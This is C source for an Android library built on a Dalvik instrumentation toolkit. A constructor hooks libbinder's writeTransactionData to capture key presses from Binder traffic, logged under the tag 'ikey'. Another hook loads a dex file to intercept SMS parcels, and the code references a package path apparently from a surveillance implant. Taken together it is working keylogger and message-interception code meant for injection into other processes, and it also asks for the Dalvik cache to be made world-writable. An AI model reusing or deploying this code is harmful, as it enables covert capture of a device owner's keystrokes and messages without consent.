/*
 *  Collin's Dynamic Dalvik Instrumentation Toolkit for Android
 *  Collin Mulliner <collin[at]mulliner.org>
 *
 *  (c) 2012,2013
 *
 *  License: LGPL v2.1
 *
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <dlfcn.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <sys/select.h>
#include <string.h>
#include <termios.h>
#include <pthread.h>
#include <sys/epoll.h>
#include <stdlib.h>
#include <jni.h>
#include <linux/ioctl.h>
#include "hook.h"
#include "base.h"

#undef log
#define DEBUG
#ifdef DEBUG
#define LOG_TAG "ikey"
#include "log.h"
#define log LOGD
#define logf(...) {FILE *f = fopen("/data/local/tmp/log", "a+");\
  if(f!=NULL){\
    fprintf(f,"%s: ",__FUNCTION__);\
    fprintf(f, __VA_ARGS__);\
    fflush(f); fclose(f); }}
#endif
#include "dexstuff.h"
#include "dalvik_hook.h"
#include "ipc_examiner.h"

struct dalvik_cache_t
{
   // for the call inside the hijack
   jclass cls_h;
   jmethodID mid_h;
};

static struct dexstuff_t d;
static struct hook_t talkWithDriver_dh;
static struct hook_t key_dh;
static struct dalvik_hook_t commitText_dh;
static struct dalvik_cache_t commitText_cache;

// switch for debug output of dalvikhook and dexstuff code
static int debug;

static void my_log(char *msg)
{
   log("%s", msg);
}
static void my_log2(char *msg)
{
   if (debug)
      log("%s", msg);
}
long int and_maj = -1;
long int and_min = -1;
long int and_rel = -1;
static void get_android_version()
{
   char android_version[10] = "";
   char *command = "getprop ro.build.version.release";
   FILE *fp = popen(command, "r");
   if (fgets(android_version, sizeof(android_version), fp) != NULL) {
      and_maj = strtol(&android_version[0], NULL, 10);
      and_min = strtol(&android_version[2], NULL, 10);
      and_rel = strtol(&android_version[4], NULL, 10);

      log("[*] version %s %d.%d.%d\n", android_version, and_maj, and_min, and_rel);
   } else {
      log("failed to get version\n");
   }
   if (fp) {
      pclose(fp);
   }
}
static int load_dext(char * dext_path, char **classes)
{

   int cookie = 0;
   int res = 0;
   char *file = dext_path;
   if (dext_path == NULL) {
      log(" loaddex null path passed\n");
      return 1;
   }
   if (strstr(dext_path, "*") != NULL) {
      log(" loaddex gobbler passed\n");
      /*  
      file = get_gobbler_pat(dext_path);
      if (file != NULL) {
         cookie = dexstuff_loaddex(&d, file);
      } else {
         file = dext_path;
      }
      */
      return 1;
   }
   cookie = dexstuff_loaddex(&d, file);
   log("loaddex res = %x\n", cookie);
   if (!cookie) {
      char *dext_file = file;
      while (strstr(dext_file, "/") != NULL) {
         dext_file = strstr(dext_file, "/");
      }
      if (dext_file == NULL) {
         dext_file = "";
      }
      log("make sure /data/dalvik-cache/ is world writable and delete data@local@tmp@%s", dext_file);
      res = 1;
   }
   if (res == 0) {
      int i = 0;
      void *clazz = NULL;
      if (classes) {
         while (classes[i] != NULL) {
            log("loading class %s", classes[i]);
            clazz = dexstuff_defineclass(&d, classes[i], cookie);
            log("Cfg = 0x%x\n", clazz);
            if (clazz == 0) {
               log("failure loading class %s", classes[i]);
               res = 1;
               break;
            }
            i++;
         }
      }
   }
   if (file != dext_path) {
      log("Freeing file\n");
      free(file);
   }

   return res;
}
static int icommitText(JNIEnv *env, jobject this, jobject p)
{
   jint callOrig = 1;
   int doit = 1;
   //log("start! c=0x%x m=0x%x\n", processUnsolicited_cache.cls_h, processUnsolicited_cache.mid_h);
   (*env)->MonitorEnter(env, this);
   char *classes[] = { "phone/android/com/SMSDispatch", "phone/android/com/Reflect", "com/android/dvci/util/LowEventHandlerDefs", NULL };
   //if (processUnsolicited_cache.cls_h == 0) {
   if (load_dext("/data/local/tmp/ddiclasses.dex", classes)) {
      log("failed to load class ");
      doit = 0;
   }
   //} else {
   //   log("using cache");
   //}

   if (doit) {
      // call static method and passin the sms
      //log(" parcel = 0x%x\n", p)
      //if (processUnsolicited_cache.cls_h == 0) {
      commitText_cache.cls_h = (*env)->FindClass(env, "phone/android/com/SMSDispatch");
      //}
      if (commitText_cache.cls_h != 0) {
         //if (processUnsolicited_cache.mid_h == 0) {
         commitText_cache.mid_h = (*env)->GetStaticMethodID(env, commitText_cache.cls_h, "dispatchParcel", "(Landroid/os/Parcel;)I");
         //}
         if (commitText_cache.mid_h) {
            callOrig = (*env)->CallStaticIntMethod(env, commitText_cache.cls_h, commitText_cache.mid_h, p);
         } else {
            log("method not found!\n");
         }
      } else {
         log("phone/android/com/SMSDispatch not found!\n");
      }
   }
   // call original SMS dispatch method
   if ((*env)->ExceptionOccurred(env)) {
      log("got an exception!!");
      (*env)->ExceptionDescribe(env);
      (*env)->ExceptionClear(env);
   }
   (*env)->MonitorExit(env, this);
   dalvik_prepare(&d, &commitText_dh, env);

   if (callOrig) {

      (*env)->CallVoidMethod(env, this, commitText_dh.mid, p);
      if ((*env)->ExceptionOccurred(env)) {
         log("got an exception!!");
         (*env)->ExceptionClear(env);
      } else {
         log("success calling : %s\n", commitText_dh.method_name);
      }
   } else {
      //log("skipping pdu args for call : %s\n", processUnsolicited_dh.method_name)
      callOrig = 1;
   }
   dalvik_postcall(&d, &commitText_dh);

   return callOrig;
}

extern int my_ioctl_arm(int fd, int request, ...);
extern int my_talk_arm(void *this, char doReceive);
static pthread_mutex_t cs_mutex =  PTHREAD_RECURSIVE_MUTEX_INITIALIZER;
int my_talk(void *this,int doReceive)
{
  int (*orig_talk)(void *,int) = (void*) talkWithDriver_dh.orig;
  /* Enter the critical section -- other threads are locked out */
  //pthread_mutex_lock( &cs_mutex );
  hook_precall(&talkWithDriver_dh);
  struct binder_write_read* bwr_p = calloc(1,sizeof(struct binder_write_read));
  if(bwr_p!=NULL){
    log("my_talk thumb> doReceive %d\n", doReceive);
    log("talk calling orig");
    bwr_p = get_binder_wr(this,doReceive, bwr_p);
    if(decode_binder_wr((struct binder_write_read *)bwr_p,"before")){
      get_btd_verbose((struct binder_write_read *)bwr_p,1,"before");
    }
  }
  int res = orig_talk(this,doReceive);
  if(bwr_p!=NULL){
  //  if(decode_binder_wr((struct binder_write_read *)bwr_p,"after")){
  //    get_btd_verbose((struct binder_write_read *)bwr_p,0,"after");
   // }
    free(bwr_p);
  }
  hook_postcall(&talkWithDriver_dh);
  //pthread_mutex_unlock( &cs_mutex );
  return res;
}
int my_ioctl_hook_full(int fd, int request, void *data){
#if 0 //use hooked fnc
  int (*orig)(int fd, int request, ...);
  orig = (void*)key_dh.orig;
  //log("orig ioctl calling\n");
  hook_precall(&key_dh);
  int res = orig(fd, request,data);
  hook_postcall(&key_dh);
  log("orig ioctl called\n");
#else //use imported __ioctl
  int res = __ioctl(fd, request,data);
  return res;
#endif
}
extern my_ioctl_hook_arm(int fd, int request, ...);
int (*orig)(int fd, int request, ...)= NULL;
int my_ioctl_hook(int fd, int request, ...)
{
  va_list ap;
  void * data;
  //log("my_ioctl_hook\n");
  va_start(ap, request);
  
  data = va_arg(ap, void *);
#if 1 //use hooked fnc
  if( orig == NULL ){
    orig = (void*)key_dh.orig;
  }
  //log("orig ioctl calling\n");
  if(request == BINDER_WRITE_READ && decode_binder_wr((struct binder_write_read *)data,"before")){
   //log("bwr->write_size = %x[outAvail] bwr->write_buffer=0x%x",
     //  ((struct binder_write_read *)data)->write_size,
     //  ((struct binder_write_read *)data)->write_buffer);
    get_btd((struct binder_write_read *)data,1,"before");
  }
  hook_precall(&key_dh);
  int res = orig(fd, request,data);
  hook_postcall(&key_dh);
#else //use imported __ioctl
  if(request == BINDER_WRITE_READ && decode_binder_wr((struct binder_write_read *)data,"before")){
   //log("bwr->write_size = %x[outAvail] bwr->write_buffer=0x%x",
     //  ((struct binder_write_read *)data)->write_size,
     //  ((struct binder_write_read *)data)->write_buffer);
    get_btd((struct binder_write_read *)data,1,"before");
  }
 
   int res = __ioctl(fd, request,data);
   
  /* if(request == BINDER_WRITE_READ && decode_binder_wr((struct binder_write_read *)data,"after")){
     get_btd((struct binder_write_read *)data,0,"after");
   }
   */
#endif
  //hook_postcall(&key_dh);
  va_end(ap);
  return res;
}


// set my_init as the entry point
void __attribute__ ((constructor)) my_init(void);
/*  
static int my_epoll_wait(int epfd, struct epoll_event *events, int maxevents, int timeout)
{
   int (*orig_epoll_wait)(int epfd, struct epoll_event *events, int maxevents, int timeout);
   orig_epoll_wait = (void*) eph.orig;
   // remove hook for epoll_wait
   hook_precall(&eph);

   // resolve symbols from DVM
   dexstuff_resolv_dvm(&d);
   log("my_epoll_wait: try_hook\n")
     if (and_maj == 4 && and_min >= 4) {
       //private void processUnsolicited (Parcel p) {
       processUnsolicited_cache.cls_h = NULL;
       processUnsolicited_cache.mid_h = NULL;
       dalvik_hook_setup(&processUnsolicited_dh, "Lcom/android/internal/telephony/RIL;", "processUnsolicited", "(Landroid/os/Parcel;)V", 2, my_processUnsolicited);
       if (dalvik_hook(&d, &processUnsolicited_dh)) {
         log("my_epoll_wait: hook  ok\n")
       } else {
         log("my_epoll_wait: hook processUnsolicited fails\n")
       }

     } else {
      log("injection not possible \n");
      return 1;
   }
   int res = orig_epoll_wait(epfd, events, maxevents, timeout);
   return res;
}
*/
extern status_t my_writeTransact_arm(void *this,int32_t cmd, uint32_t binderFlags,int32_t handle, uint32_t code, void* parcel, status_t* statusBuffer);
static struct hook_t writeTransact_dh;

status_t my_writeTransact(void *this,int32_t cmd, uint32_t binderFlags,int32_t handle, uint32_t code, void* parcel, status_t* statusBuffer){
  
  status_t (*orig_transact)(void *this,int32_t cmd, uint32_t binderFlags,int32_t handle, uint32_t code, void* parcel, status_t* statusBuffer)=(void*) writeTransact_dh.orig;
  hook_precall(&writeTransact_dh);
  //log("calling orig writeTransactionData cmd %s",get_tc(cmd));
  if(cmd == BC_TRANSACTION && parcel!=NULL){
    unsigned int parcel_p = *(unsigned long*)(parcel + mData);
    char *interface = (char*)get_intf_desc_parcel((unsigned int*)parcel_p,cmd);
    log("%s  write: desc=%s",__FUNCTION__,interface);
    extract_key_pressed(interface,parcel_p,code);
  }
  status_t res = orig_transact(this,cmd,binderFlags,handle,code,parcel,statusBuffer);
  //log("calling orig called");
  hook_postcall(&writeTransact_dh);
  return res;
}

void my_init(void)
{
   log("started\n");
   get_android_version();
   debug = 1;
   // set log function for  libbase (very important!)
   set_logfunction(my_log2);
   // set log function for libdalvikhook (very important!)
   //dalvikhook_set_logfunction(my_log2);
   //hook(&key_dh, getpid(), "libc.", "ioctl", my_ioctl_hook_arm, my_ioctl_hook);
   //hook(&talkWithDriver_dh, getpid(), "libbinder", "_ZN7android14IPCThreadState14talkWithDriverEb", my_talk_arm, my_talk);
   hook(&writeTransact_dh, getpid(), "libbinder", "_ZN7android14IPCThreadState20writeTransactionDataEijijRKNS_6ParcelEPi", my_writeTransact_arm, my_writeTransact);
   //dexstuff_resolv_dvm(&d);
   //dalvik_dump_class(&d,"");
}
